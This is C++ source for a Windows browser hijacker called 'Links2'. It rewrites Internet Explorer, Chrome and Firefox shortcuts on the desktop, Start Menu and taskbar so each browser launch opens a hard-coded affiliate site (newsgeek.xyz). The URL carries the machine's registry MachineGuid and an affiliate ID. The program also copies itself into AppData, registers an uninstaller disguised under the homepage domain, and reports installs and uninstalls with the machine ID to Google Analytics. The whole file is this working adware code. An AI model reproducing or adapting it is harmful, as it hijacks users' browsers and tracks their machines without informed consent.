/*
 * links2.exe <install/uninstall> <affiliate_id>
 *
 * C:\ProgramData\Microsoft\Windows\Start Menu
 * C:\ProgramData\Microsoft\Windows\Start Menu\Programs
 * C:\Users\Daniel\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\StartMenu
 * C:\Users\Daniel\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\User Pinned\TaskBar
 * C:\Users\Daniel\AppData\Roaming\Microsoft\Windows\Start Menu\Programs
 * C:\Users\Daniel\Desktop
 * C:\Users\Public\Desktop
 */

#include "stdafx.h"
#include "Registry.h"
#include "WinHttpRequest.h"

const TCHAR kAppName[] = _T("Links2");
const TCHAR kGoogleChromeDir[] = _T("\\Google Chrome");
const TCHAR kPinnedTaskBarDir[] = _T("\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\TaskBar");
const TCHAR kPinnedStartMenuDir[] = _T("\\Microsoft\\Internet Explorer\\Quick Launch\\User Pinned\\StartMenu");
const TCHAR kTrackingEndpoint[] = _T("http://www.google-analytics.com/collect");
const TCHAR kTrackingAccountId[] = _T("UA-68101767-2");
const TCHAR kAppRegKey[] = _T("Software\\Links2");
const TCHAR kCryptoRegKey[] = _T("Software\\Microsoft\\Cryptography");
const TCHAR kUninstallRegKey[] = _T("Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\Links2");

const TCHAR kLinkExtension[] = _T(".lnk");

const TCHAR* kLinkNames[] = {
	_T("Internet Explorer.lnk"),
	_T("Internet Explorer (64-bit).lnk"),
	_T("Google Chrome.lnk"),
	_T("Mozilla Firefox.lnk")
};

// ----------------------------------------------------------------------------
bool PatchLink(const ATL::CString _linkFilePath, const ATL::CString _urlArg)
{
	IShellLink* pShellLink = NULL;
	HRESULT hr = ::CoCreateInstance(
		CLSID_ShellLink, 
		NULL, 
		CLSCTX_INPROC_SERVER, 
		IID_IShellLink, 
		(LPVOID*)&pShellLink);
	ATLENSURE_RETURN_VAL(SUCCEEDED(hr), false);
	ATLENSURE_RETURN_VAL(pShellLink, false);

	CComPtr<IShellLink> spShellLink(pShellLink);
	ATLENSURE_RETURN_VAL(spShellLink, false);

	CComQIPtr<IPersistFile> spPersistFile(spShellLink);
	ATLENSURE_RETURN_VAL(spPersistFile, false);

	hr = spPersistFile->Load(_linkFilePath, STGM_READ); 
	ATLENSURE_RETURN_VAL(SUCCEEDED(hr), false);

	ATL::CString sUrlArg;
	if (!_urlArg.IsEmpty())
		sUrlArg.Format(_T("\"%s\""), _urlArg);

	hr = spShellLink->SetArguments(sUrlArg);
	ATLENSURE_RETURN_VAL(SUCCEEDED(hr), false);

	hr = spPersistFile->Save(_linkFilePath, TRUE);
	ATLENSURE_RETURN_VAL(SUCCEEDED(hr), false);

	return true;
}

// ----------------------------------------------------------------------------
DWORD PatchDir(const ATL::CString& _dir, const ATL::CString _urlArg)
{
	DWORD dwPatchedLinks = 0;

	ATL::CString sDirWithFilter;
	::PathCombine(sDirWithFilter.GetBufferSetLength(MAX_PATH), _dir, _T("*"));
	sDirWithFilter.ReleaseBuffer();

	WIN32_FIND_DATA fd = {0};
	HANDLE hFile = ::FindFirstFile(sDirWithFilter, &fd);
	if (INVALID_HANDLE_VALUE == hFile)
		return 0;

	int iLinksCnt = _countof(kLinkNames);
	int iEqualStrings = -1;
	ATL::CString sFileExt;
	ATL::CString sFilePath;

	do
	{
		if (FILE_ATTRIBUTE_DIRECTORY != (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
		{
			sFileExt = ::PathFindExtension(fd.cFileName);
			if (sFileExt == kLinkExtension)
			{
				int i = iLinksCnt;
				while (i && (iEqualStrings = _tcscmp(fd.cFileName, kLinkNames[--i])) != 0);
				if (0 == iEqualStrings)
				{
					::PathCombine(sFilePath.GetBufferSetLength(MAX_PATH), _dir, fd.cFileName);
					sFilePath.ReleaseBuffer();

					if (PatchLink(sFilePath, _urlArg))
						dwPatchedLinks++;
				}
			}
		}
	} while(::FindNextFile(hFile, &fd));

	BOOL rv = ::FindClose(hFile);
	ATLASSERT(rv);
	hFile = NULL;

	return dwPatchedLinks;
}

// ----------------------------------------------------------------------------
ATL::CString GetFolderPath(int _csidl)
{
	ATL::CString sBuf;
	HRESULT hr=::SHGetFolderPath(
		NULL,
		_csidl,
		NULL,
		0,
		sBuf.GetBufferSetLength(MAX_PATH));
	sBuf.ReleaseBuffer();
	ATLASSERT(SUCCEEDED(hr));

	return sBuf;
}

// ----------------------------------------------------------------------------
CString EscapeUrlComponent(ATL::CString _url)
{
	ATL::CString sEscaped;
	DWORD dwBufLen = _url.GetLength();
	HRESULT hr = ::UrlEscape(
		_url, 
		sEscaped.GetBufferSetLength(dwBufLen + 2),
		&dwBufLen, 
		URL_ESCAPE_SEGMENT_ONLY);
	sEscaped.ReleaseBuffer();
	if (E_POINTER == hr)
	{
		hr = ::UrlEscape(
			_url, 
			sEscaped.GetBufferSetLength(dwBufLen + 2),
			&dwBufLen, 
			URL_ESCAPE_SEGMENT_ONLY);
		sEscaped.ReleaseBuffer();
		ATLASSERT(SUCCEEDED(hr));
	}

	return sEscaped;
}

// ----------------------------------------------------------------------------
// A very rough approximation of a URL structure. This will break for many
// types of URLs but should work for simple URLs like the one we use with
// this project.
void UrlAddArg(ATL::CString& _url, const ATL::CString& _name, const ATL::CString& _value)
{
	CString sDelimiter = _url.Find(_T("?")) == -1 ? _T("?") : _T("&");
	CString sArg;
	sArg.Format(_T("%s%s=%s"), sDelimiter, _name, _value);
	_url.Append(sArg);
}

// ----------------------------------------------------------------------------
bool GetImagePathName(ATL::CString& _path)
{
	// Get current image file path and image name
	static enum { LONG_PATH = 32767 };
	ATL::CString sFilePath;
	::GetModuleFileName(NULL, sFilePath.GetBufferSetLength(LONG_PATH), LONG_PATH);
	sFilePath.ReleaseBuffer();
	BOOL rv = ATL::ATLPath::FileExists(sFilePath);
	ATLENSURE_RETURN_VAL(rv, false);
	_path = sFilePath;

	return true;
}

// ----------------------------------------------------------------------------
// Google Analytics page tracking
bool Track(const ATL::CString& _machineId,
		   const ATL::CString& _affiliateId,
		   const ATL::CString& _installDate,
		   const ATL::CString& _campaignName,
		   const ATL::CString& _documentLocation)
{
	// Get random number (to bust tracking server URL caching)
	int iRand = rand();

	// Format tracking URL
	CString sTrackingUrl;
	sTrackingUrl.Format(
		_T("%s?v=1&t=pageview&tid=%s&cid=%s&uid=%s&cs=%s&ck=%s&cn=%s&dp=%s&z=%d"),
		kTrackingEndpoint,
		EscapeUrlComponent(kTrackingAccountId),
		EscapeUrlComponent(_machineId),
		EscapeUrlComponent(_machineId),
		EscapeUrlComponent(_affiliateId),
		EscapeUrlComponent(_installDate),
		EscapeUrlComponent(_campaignName),
		EscapeUrlComponent(_documentLocation),
		iRand);
	LOG_DEBUG(_T("Tracking URL: %s"), sTrackingUrl);

	// Send tracking request
	ATL::CString sResponseBytes;
	long lHttpResponseCode = 0;
	bool rv = WinHttp::Get(sTrackingUrl, sResponseBytes, lHttpResponseCode);
	ATLENSURE_RETURN_VAL(rv, false);

	return true;
}

// ----------------------------------------------------------------------------
bool RegisterUninstaller(const ATL::CString& _appNameAlias, const ATL::CString& _affiliateId)
{
	ATL::CString sFilePath;
	bool rv = GetImagePathName(sFilePath);
	ATLENSURE_RETURN_VAL(rv, false);
	ATL::CString sFileName = ATL::ATLPath::FindFileName(sFilePath);
	
	ATL::CString sUninstallString;
	sUninstallString.Format(_T("%s uninstall %s"), sFilePath, _affiliateId);

	rv = Registry::SetStringValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("UninstallString"), sUninstallString);
	ATLENSURE_RETURN_VAL(rv, false);
	Registry::SetStringValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("DisplayIcon"), sFileName);
	ATLENSURE_RETURN_VAL(rv, false);
	Registry::SetStringValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("DisplayName"), _appNameAlias);
	ATLENSURE_RETURN_VAL(rv, false);
	Registry::SetStringValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("Publisher"), kAppName);
	ATLENSURE_RETURN_VAL(rv, false);

	return true;
}

// ----------------------------------------------------------------------------
bool UnregisterUninstaller(const ATL::CString& _appNameAlias)
{
	bool rv = Registry::DeleteValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("UninstallString"));
	ATLENSURE_RETURN_VAL(rv, false);
	rv = Registry::DeleteValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("DisplayIcon"));
	ATLENSURE_RETURN_VAL(rv, false);
	rv = Registry::DeleteValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("DisplayName"));
	ATLENSURE_RETURN_VAL(rv, false);
	rv = Registry::DeleteValue(HKEY_LOCAL_MACHINE, kUninstallRegKey, _T("Publisher"));
	ATLENSURE_RETURN_VAL(rv, false);
	
	// TODO: This fails for some reason
	rv = Registry::DeleteSubKey(HKEY_LOCAL_MACHINE, kUninstallRegKey);
	//ATLENSURE_RETURN_VAL(rv, false);

	return true;
}

// ----------------------------------------------------------------------------
bool InstallSelf()
{
	ATL::CString sFilePath;
	bool res = GetImagePathName(sFilePath);
	ATLENSURE_RETURN_VAL(res, false);
	ATL::CString sFileName = ATL::ATLPath::FindFileName(sFilePath);

	// Create installation directory
	CString sAppDataPath = GetFolderPath(CSIDL_APPDATA);
	CString sInstallDir;
	sInstallDir.Format(_T("%s\\%s"), sAppDataPath, kAppName);
	BOOL rv = ATL::ATLPath::FileExists(sInstallDir);
	if (!rv)
	{
		rv = ::CreateDirectory(sInstallDir, NULL);
		ATLENSURE_RETURN_VAL(rv, false);
	}

	// Copy self to installation directory
	ATL::CString sInstallPath;
	sInstallPath.Format(_T("%s\\%s"), sInstallDir, sFileName);
	// Overwrite if target file already exists
	rv = ::CopyFile(sFilePath, sInstallPath, FALSE);
	ATLENSURE_RETURN_VAL(rv, false);

	return true;
}

// ----------------------------------------------------------------------------
extern "C" int WINAPI _tWinMain(HINSTANCE hInstance, 
								HINSTANCE hPrevInstance, 
								LPTSTR lpCmdLine, 
								int nShowCmd)
{
	UNREFERENCED_PARAMETER(hInstance);
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

#ifdef _DEBUG
	_CrtSetDbgFlag(_CRTDBG_ALLOC_MEM_DF | _CRTDBG_LEAK_CHECK_DF);
#endif

	::CoInitialize(NULL);

	// Seed random numbers
	srand((unsigned)time(NULL));

	// Get machine unique ID
	CString sMachineUniqueId;
	Registry::QueryStringValue(
		HKEY_LOCAL_MACHINE, kCryptoRegKey, _T("MachineGuid"), sMachineUniqueId, KEY_WOW64_64KEY);
	ATLENSURE_RETURN_VAL(!sMachineUniqueId.IsEmpty(), 1);

	// Parse command line:
	// Affiliate ID is not optional
	// URL argument is optional. If URL is empty, we use a blank link, 
	// effectively removing the URL from browsers shortcuts.
	int iNumArgs = 0;
	LPWSTR* argv = ::CommandLineToArgvW(::GetCommandLineW(), &iNumArgs);
	ATLENSURE_RETURN_VAL(argv, 1);
	
	// Dynamic homepage URLs as in arguments
	//ATLENSURE_RETURN_VAL(iNumArgs >= 3, 1);
	//ATLENSURE_RETURN_VAL(iNumArgs <= 4, 1);
	//ATL::CString sActions = argv[1];
	//ATL::CString sAffiliateId = argv[2];
	//ATL::CString sUrlArg = (iNumArgs == 3 ? argv[2] : _T(""));

	// Hard-coded homepage URLs
	ATL::CString sHomepage(_T("newsgeek.xyz"));
	//ATL::CString sHomepage(_T("indiantimes.xyz"));
	//ATL::CString sHomepage(_T("bbnews.xyz"));
	//ATL::CString sHomepage(_T("timesindia.xyz"));
	//ATL::CString sHomepage(_T("olnews.xyz"));

	ATLENSURE_RETURN_VAL(iNumArgs == 3, 1);
	ATL::CString sActions = argv[1];
	ATL::CString sAffiliateId = argv[2];
	ATL::CString sUrl(_T(""));
	bool bInstalling = (0 == sActions.CompareNoCase(_T("install")));
	ATL::CString sDate;
	if (bInstalling)
	{
		SYSTEMTIME st = {0};
		::GetSystemTime(&st);
		sDate.Format(_T("%02d%02d%d"), st.wDay, st.wMonth, st.wYear);
		LOG_DEBUG(_T("Current date (UTC): %s"), sDate);

		sUrl.Format(_T("http://www.%s"), sHomepage);

		// Add date argument to the URL
		UrlAddArg(sUrl, _T("dt"), sDate);
		UrlAddArg(sUrl, _T("aid"), sAffiliateId);
		UrlAddArg(sUrl, _T("uid"), sMachineUniqueId);
	}
	else
	{
		// Get install date from the registry
		bool rv = Registry::QueryStringValue(HKEY_CURRENT_USER, kAppRegKey, _T("dt"), sDate);
		ATLENSURE_RETURN_VAL(rv, 1);
	}

	std::set<ATL::CString> directories;
	directories.insert(GetFolderPath(CSIDL_COMMON_DESKTOPDIRECTORY));
	directories.insert(GetFolderPath(CSIDL_DESKTOP));
	directories.insert(GetFolderPath(CSIDL_DESKTOPDIRECTORY));
	directories.insert(GetFolderPath(CSIDL_COMMON_STARTMENU));
	directories.insert(GetFolderPath(CSIDL_COMMON_PROGRAMS));
	directories.insert(GetFolderPath(CSIDL_COMMON_PROGRAMS) + kGoogleChromeDir);
	directories.insert(GetFolderPath(CSIDL_PROGRAMS));
	directories.insert(GetFolderPath(CSIDL_PROGRAMS) + kGoogleChromeDir);
	directories.insert(GetFolderPath(CSIDL_APPDATA) + kPinnedTaskBarDir);
	directories.insert(GetFolderPath(CSIDL_APPDATA) + kPinnedStartMenuDir);

	DWORD dwPatchedLinks = 0;
	std::set<ATL::CString>::const_iterator itr;
	for (itr = directories.begin(); itr != directories.end(); ++itr)
		dwPatchedLinks += PatchDir(*itr, sUrl);

	if (dwPatchedLinks)
	{
		if (bInstalling)
		{
			InstallSelf();
			RegisterUninstaller(sHomepage, sAffiliateId);
			Track(sMachineUniqueId, sAffiliateId, sDate, _T("Installed"), sHomepage);

			// Flag successful installation
			Registry::SetStringValue(HKEY_CURRENT_USER, kAppRegKey, _T("dt"), sDate);
		}
		else
		{
			UnregisterUninstaller(sHomepage);
			Track(sMachineUniqueId, sAffiliateId, sDate, _T("Uninstalled"), sHomepage);
		}
	}

	::CoUninitialize();

	return 0;
}
